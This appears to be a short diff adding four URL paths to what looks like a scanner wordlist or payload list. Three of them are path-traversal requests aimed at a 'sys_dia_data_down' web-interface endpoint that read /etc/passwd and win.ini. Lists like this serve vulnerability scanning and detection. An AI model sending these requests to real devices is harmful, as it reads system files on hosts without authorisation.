@@ -1,0 +1,4 @@
+/webui/?g=sys_dia_data_down&file_name=../etc/passwd
+/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd
+/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../c:/windows/win.ini
+/login.html
